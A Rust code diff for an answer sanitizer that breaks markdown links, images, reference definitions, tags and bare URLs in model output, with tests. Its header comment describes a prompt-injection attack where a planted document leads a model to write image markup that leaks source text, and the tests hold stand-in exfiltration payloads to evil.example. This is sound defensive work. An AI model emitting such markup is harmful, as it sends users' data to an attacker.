@@ -1,20 +1,29 @@
 //! The answer as it leaves roll: model output is untrusted, and a planted document can make the
 //! model write markup that a chat UI loads or links (`![.](https://evil.example/p?d=<other
-//! sources>)`), sending text the reader may read to someone else. So every answer, streamed or
-//! whole, native or OpenAI's, goes through [`Sanitizer`], which breaks that markup without
-//! removing anything (the reader still sees the text):
+//! sources>)`, or a reference definition and `![x][a]`), sending text the reader may read to
+//! someone else. So every answer, streamed or whole, native or OpenAI's, goes through
+//! [`Sanitizer`], which breaks that markup wherever it stands, without following CommonMark's
+//! line or container rules (a definition counts inside a block quote or a list item, its label may
+//! span lines or hold `\]`), and without removing anything (the reader still sees the text):
 //!
-//! - an inline link's or image's `](` becomes `]\(`, so neither renders, and its URL a code span;
-//! - a reference definition's `]:` (at a line's start) becomes `]\:`;
-//! - a `<` that starts a tag or an autolink becomes `\<`;
-//! - a bare URL (`http://`, `https://`, `ftp://`, `www.`) becomes a code span, which renders as
-//!   text and is never linked or fetched.
+//! - every `](` becomes `]\(`, so no inline link or image renders, and their URLs code spans;
+//! - every `]:` becomes `]\:`, so no reference definition (nor footnote) exists, and a reference
+//!   link or image (`[x][a]`, `![x][a]`) has nothing to point at;
+//! - a `<` that starts a tag or an autolink becomes `&lt;`, which no backslash can cancel;
+//! - a bare URL (`http://`, `https://`, `ftp://`, `www.`, and protocol-relative `//host…`) becomes
+//!   a code span, which renders as text and is never linked or fetched;
+//! - `\r` and `\r\n` become `\n` first, so every renderer sees the same lines.
 //!
 //! A profile with `allow_links` keeps inline links (never images) whose URL is exactly one in the
-//! given sources' fields. While streaming, text that could still become one of these is held back
-//! until it settles: a trailing `]` or `<`, a trailing word that is or may become a URL, a line
-//! starting with `[` before its `]` is followed, and with `allow_links` an open `[…](…`. At most
-//! [`MAX_HOLD`] bytes are held; past it they're released with any open construct broken.
+//! given sources' fields, and a bare such URL only when whitespace or the answer's end follows it
+//! (GFM's autolinks run on to the next space). While streaming, text that could still become one
+//! of these is held back until it settles: a trailing `]`, `<` or `\`, a trailing word that is or
+//! may become a URL, and an open `[…](…`. At most [`MAX_HOLD`] bytes are held; past it they're
+//! released, a trailing `]`, `<` or `\` as its entity.
+//!
+//! What this doesn't do (docs/search/rag.md): kept links carry no `rel` or `referrerpolicy`
+//! (that's the renderer's); code the model writes in a fence is escaped like any text; and a
+//! renderer that links bare domains (markdown-it's fuzzy linkify) can still link `example.com`.
 
 use regex::Regex;
 use std::sync::OnceLock;
@@ -22,19 +31,27 @@ use std::sync::OnceLock;
 /// The most bytes held back.
 pub const MAX_HOLD: usize = 2048;
 
-/// Breaks links, images, autolinks, tags and bare URLs in an answer as it streams.
+/// Breaks links, images, definitions, autolinks, tags and bare URLs in an answer as it streams.
 pub struct Sanitizer {
     held: String,
     /// URLs a link may keep (`allow_links`: the sources' own); `None`: no links at all.
     allowed: Option<Vec<String>>,
-    /// What was released so far ended a line (or nothing was).
-    line_start: bool,
+    /// The last text fed ended with `\r`: a `\n` starting the next is the same line ending.
+    after_cr: bool,
 }
 
 fn markup() -> &'static Regex {
     static R: OnceLock<Regex> = OnceLock::new();
     R.get_or_init(|| {
-        Regex::new(r"(?P<link>(?P<bang>!)?\[(?P<text>[^\[\]\n]*)\]\((?P<url>[^()\s]*)\))|(?P<close>\]\()|(?P<auto><(?P<aurl>(?i:https?://|ftp://|www\.)[^\s<>`]*)(?P<gt>>)?)|(?P<tag><[A-Za-z/!?])|(?P<bare>(?i:https?://|ftp://|www\.)[^\s<>`)\]]+)").expect("the markup pattern")
+        Regex::new(concat!(
+            r"(?P<link>(?P<bang>!)?\[(?P<text>[^\[\]\n]*)\]\((?P<url>[^()\s]*)\))",
+            r"|(?P<close>\]\()",
+            r"|(?P<defn>\]:)",
+            r"|(?P<auto><(?P<aurl>(?i:https?://|ftp://|www\.|//)[^\s<>`]*)(?P<gt>>)?)",
+            r"|(?P<tag><[A-Za-z/!?])",
+            r"|(?P<bare>(?i:https?://|ftp://|www\.)[^\s<>`)\]]+|//[A-Za-z0-9-]+(?:\.[A-Za-z0-9-]+)+[^\s<>`)\]]*)",
+        ))
+        .expect("the markup pattern")
     })
 }
 
@@ -50,34 +67,41 @@ fn url_ahead(word: &str) -> bool {
     if w.is_empty() {
         return false;
     }
-    w.contains("://") || w.starts_with("www.") || ["https://", "http://", "ftp://", "www."].iter().any(|p| p.starts_with(w.as_str()))
-}
-
-/// Whether a line (from its start) opens a reference definition `[label]:`, or may still.
-fn definition(line: &str) -> Option<bool> {
-    let indent = line.len() - line.trim_start_matches(' ').len();
-    let t = &line[indent..];
-    if indent > 3 || !t.starts_with('[') {
-        return Some(false);
-    }
-    match t.find(']') {
-        None => None,
-        Some(i) => match t.as_bytes().get(i + 1) {
-            None => None,
-            Some(b':') => Some(true),
-            Some(_) => Some(false),
-        },
-    }
+    w.contains("://") || w.starts_with("www.") || w.starts_with('/') || ["https://", "http://", "ftp://", "www."].iter().any(|p| p.starts_with(w.as_str()))
 }
 
 impl Sanitizer {
     pub fn new(allowed: Option<Vec<String>>) -> Sanitizer {
-        Sanitizer { held: String::new(), allowed, line_start: true }
+        Sanitizer { held: String::new(), allowed, after_cr: false }
+    }
+
+    /// `text` with `\r\n` and `\r` as `\n` (a `\r\n` split across two pieces too).
+    fn lines(&mut self, text: &str) -> String {
+        let mut out = String::with_capacity(text.len());
+        let mut chars = text.chars().peekable();
+        if self.after_cr && chars.peek() == Some(&'\n') {
+            chars.next();
+        }
+        while let Some(c) = chars.next() {
+            if c == '\r' {
+                out.push('\n');
+                if chars.peek() == Some(&'\n') {
+                    chars.next();
+                }
+            } else {
+                out.push(c);
+            }
+        }
+        if !text.is_empty() {
+            self.after_cr = text.ends_with('\r');
+        }
+        out
     }
 
     /// Takes `text` and answers what can be released now.
     pub fn feed(&mut self, text: &str) -> String {
-        self.held.push_str(text);
+        let text = self.lines(text);
+        self.held.push_str(&text);
         let mut cut = self.hold_from();
         let forced = self.held.len() - cut > MAX_HOLD;
         if forced {
@@ -104,12 +128,6 @@ impl Sanitizer {
         if url_ahead(&b[ws..]) {
             cut = cut.min(ws);
         }
-        let line = b.rfind('\n').map(|i| i + 1).or(self.line_start.then_some(0));
-        if let Some(ls) = line
-            && definition(&b[ls..]).is_none()
-        {
-            cut = cut.min(ls);
-        }
         // An open `[…` or `[…](…`: released whole, as one link.
         if let Some(p) = b.rfind('[') {
             let rest = &b[p..];
@@ -125,68 +143,59 @@ impl Sanitizer {
     }
 
     /// `text` with its markup broken (`forced`: released past [`MAX_HOLD`] while more may come,
-    /// so a construct still open in it is broken too).
+    /// so its last character can't start a construct with what follows).
     fn release(&mut self, text: &str, forced: bool) -> String {
         if text.is_empty() {
             return String::new();
         }
-        // Reference definitions, line by line.
-        let mut lined = String::with_capacity(text.len() + 8);
-        let mut at_start = self.line_start;
-        for piece in text.split_inclusive('\n') {
-            match (at_start, definition(piece)) {
-                (true, Some(true)) => {
-                    let i = piece.find("]:").expect("a definition has ]:");
-                    lined.push_str(&piece[..i + 1]);
-                    lined.push('\\');
-                    lined.push_str(&piece[i + 1..]);
-                }
-                // An open line-start `[` that must go now: escaped, so no `]:` can follow it.
-                (true, None) if forced => {
-                    let i = piece.find('[').expect("starts with [");
-                    lined.push_str(&piece[..i]);
-                    lined.push('\\');
-                    lined.push_str(&piece[i..]);
-                }
-                _ => lined.push_str(piece),
-            }
-            at_start = piece.ends_with('\n');
-        }
-        self.line_start = text.ends_with('\n');
         let allowed = self.allowed.as_deref();
+        let is_allowed = |u: &str| allowed.is_some_and(|a| a.iter().any(|x| x == u));
         let mut out = markup()
-            .replace_all(&lined, |c: &regex::Captures| {
+            .replace_all(text, |c: &regex::Captures| {
                 if c.name("link").is_some() {
                     let url = c.name("url").map_or("", |m| m.as_str());
-                    let keep = c.name("bang").is_none() && allowed.is_some_and(|a| a.iter().any(|u| u == url));
-                    if keep {
+                    if c.name("bang").is_none() && is_allowed(url) {
                         return c[0].to_string();
                     }
                     let bang = if c.name("bang").is_some() { "!" } else { "" };
-                    let text = c.name("text").map_or("", |m| m.as_str());
-                    return format!("{bang}[{text}]\\({})", code(url));
+                    let label = c.name("text").map_or("", |m| m.as_str());
+                    return format!("{bang}[{label}]\\({})", code(url));
                 }
                 if c.name("close").is_some() {
                     return "]\\(".to_string();
                 }
+                if c.name("defn").is_some() {
+                    return "]\\:".to_string();
+                }
                 if let Some(u) = c.name("aurl") {
                     let gt = if c.name("gt").is_some() { ">" } else { "" };
-                    return format!("\\<{}{gt}", code(u.as_str()));
+                    return format!("&lt;{}{gt}", code(u.as_str()));
                 }
                 if let Some(t) = c.name("tag") {
-                    return format!("\\{}", t.as_str());
+                    return format!("&lt;{}", &t.as_str()[1..]);
                 }
-                let url = c.name("bare").map_or("", |m| m.as_str());
-                if allowed.is_some_and(|a| a.iter().any(|u| u == url)) {
-                    return url.to_string();
+                let m = c.name("bare").expect("the last alternative");
+                // A kept URL ends at whitespace or the end: anything else would extend GFM's
+                // autolink past it.
+                let next = text[m.end()..].chars().next();
+                let ends = next.is_some_and(char::is_whitespace) || (next.is_none() && !forced);
+                if ends && is_allowed(m.as_str()) {
+                    return m.as_str().to_string();
                 }
-                code(url)
+                code(m.as_str())
             })
             .into_owned();
-        if forced && (out.ends_with(']') || out.ends_with('<')) {
-            let ch = out.pop().expect("ends with a char");
-            out.push('\\');
-            out.push(ch);
+        if forced {
+            let entity = match out.chars().last() {
+                Some(']') => Some("&#93;"),
+                Some('<') => Some("&lt;"),
+                Some('\\') => Some("&#92;"),
+                _ => None,
+            };
+            if let Some(e) = entity {
+                out.pop();
+                out.push_str(e);
+            }
         }
         out
     }
@@ -203,31 +212,51 @@ pub fn sanitize(text: &str, allowed: Option<Vec<String>>) -> String {
 #[cfg(test)]
 mod tests {
     use super::*;
+    use comrak::nodes::NodeValue;
 
-    /// Nothing in `out` renders as a link, an image, a definition, a tag or an autolink: no `](`
-    /// or line-start `]:`, no unescaped `<`, every URL inside a code span.
-    fn inert(out: &str) {
-        assert!(!out.contains("]("), "{out}");
-        assert!(out.lines().all(|l| definition(l) != Some(true) || l.contains("]\\:")), "{out}");
-        for (i, _) in out.match_indices('<') {
-            assert_eq!(out[..i].chars().last(), Some('\\'), "{out}");
-        }
-        for (i, _) in out.match_indices("://") {
-            assert_eq!(out[..i].matches('`').count() % 2, 1, "a URL outside a code span: {out}");
+    /// `out` rendered as GitHub-flavored markdown (extended autolinks, footnotes, tables) holds no
+    /// image, no HTML, no link but to `allowed`, and no text a renderer could link (a URL, a
+    /// protocol-relative `//host`).
+    fn inert(out: &str, allowed: &[&str]) {
+        let mut o = comrak::Options::default();
+        o.extension.autolink = true;
+        o.extension.footnotes = true;
+        o.extension.table = true;
+        o.extension.strikethrough = true;
+        o.extension.tasklist = true;
+        let arena = comrak::Arena::new();
+        let root = comrak::parse_document(&arena, out, &o);
+        let bare = Regex::new(r"(?i)https?://|ftp://|www\.|//[a-z0-9-]+\.[a-z]").unwrap();
+        for n in root.descendants() {
+            match &n.data().value {
+                NodeValue::Link(l) => assert!(allowed.contains(&l.url.as_str()), "a link to {} in {out:?}", l.url),
+                NodeValue::Image(l) => panic!("an image of {} in {out:?}", l.url),
+                NodeValue::HtmlInline(h) => panic!("inline HTML {h:?} in {out:?}"),
+                NodeValue::HtmlBlock(h) => panic!("an HTML block {:?} in {out:?}", h.literal),
+                NodeValue::Text(t) => assert!(!bare.is_match(t) || allowed.iter().any(|a| t.contains(a)), "linkable text {t:?} in {out:?}"),
+                _ => {}
+            }
         }
     }
 
     #[test]
     fn planted_images_and_links_are_broken_however_the_stream_splits_them() {
-        let answer = "Reset it in Settings [1].\n![.](https://evil.example/p?d=secret) and [click](https://evil.example/q) <https://evil.example/a> <img src=x>\n[r]: https://evil.example/r\nsee https://evil.example/b [2]";
-        let whole = sanitize(answer, None);
-        inert(&whole);
-        assert_eq!(
-            whole,
-            "Reset it in Settings [1].\n![.]\\(`https://evil.example/p?d=secret`) and [click]\\(`https://evil.example/q`) \\<`https://evil.example/a`> \\<img src=x>\n[r]\\: `https://evil.example/r`\nsee `https://evil.example/b` [2]"
+        let answer = concat!(
+            "Reset it in Settings [1].\n![.](https://evil.example/p?d=secret) and [click](https://evil.example/q) <https://evil.example/a> <img src=x>\n",
+            "[r]: https://evil.example/r\nsee https://evil.example/b [2]\n\n",
+            // A definition in a block quote and in a list item, used by images below.
+            "> [a]: //evil.example/p?d=1\n\n![x][a]\n\n- [b]: //evil.example/q\n\n![y][b]\n\n",
+            // A label over two lines, and one holding an escaped bracket.
+            "[\nfoo\n]: //evil.example/f\n\n![x][foo]\n\n[a\\]b]: //evil.example/e\n\n![x][a\\]b]\n\n",
+            // Bare carriage returns as line endings.
+            "ok\r[c]: //evil.example/r\r\r![x][c]\r\r",
+            // A backslash the model wrote before a tag.
+            "\\<img src=//evil.example/i>\n",
         );
-        // However the stream splits it: inert, and only `\` and backticks added.
-        let bare = |t: &str| t.replace(['\\', '`'], "");
+        let whole = sanitize(answer, None);
+        inert(&whole, &[]);
+        assert!(whole.starts_with("Reset it in Settings [1].\n![.]\\(`https://evil.example/p?d=secret`) and [click]\\(`https://evil.example/q`) &lt;`https://evil.example/a`> &lt;img src=x>\n[r]\\: `https://evil.example/r`"), "{whole}");
+        // However the stream splits it, the same answer.
         for at in 1..answer.len() {
             if !answer.is_char_boundary(at) {
                 continue;
@@ -236,13 +265,17 @@ mod tests {
             let mut out = s.feed(&answer[..at]);
             out.push_str(&s.feed(&answer[at..]));
             out.push_str(&s.finish());
-            inert(&out);
-            assert_eq!(bare(&out), bare(answer), "split at {at}");
+            assert_eq!(out, whole, "split at {at}");
         }
-        // allow_links keeps a link to a source's own URL, never an image.
+        // allow_links keeps a link to a source's own URL, never an image, and a bare one only when
+        // nothing runs on after it.
         let ok = vec!["https://help.acme.test/pw".to_string()];
-        let out = sanitize("[Reset](https://help.acme.test/pw) ![x](https://help.acme.test/pw) [y](https://evil.example)", Some(ok));
-        assert_eq!(out, "[Reset](https://help.acme.test/pw) ![x]\\(`https://help.acme.test/pw`) [y]\\(`https://evil.example`)");
+        let out = sanitize("[Reset](https://help.acme.test/pw) ![x](https://help.acme.test/pw) [y](https://evil.example) https://help.acme.test/pw)d=secret https://help.acme.test/pw", Some(ok));
+        assert_eq!(
+            out,
+            "[Reset](https://help.acme.test/pw) ![x]\\(`https://help.acme.test/pw`) [y]\\(`https://evil.example`) `https://help.acme.test/pw`)d=secret https://help.acme.test/pw"
+        );
+        inert(&out, &["https://help.acme.test/pw"]);
     }
 
     #[test]
@@ -251,5 +284,10 @@ mod tests {
         let out = s.feed(&format!("https://evil.example/{}", "a".repeat(MAX_HOLD + 10)));
         assert!(out.starts_with("`https://evil.example/") && out.ends_with('`'), "{}", &out[..40]);
         assert_eq!(s.finish(), "");
+        // Released by force, a last `]`, `<` or `\` can't join what follows.
+        let mut s = Sanitizer::new(None);
+        let out = s.feed(&format!("[x https://evil.example/{}]", "a".repeat(MAX_HOLD + 10)));
+        assert!(out.ends_with("`&#93;"), "{}", &out[out.len() - 10..]);
+        inert(&format!("{out}(x)"), &[]);
     }
 }
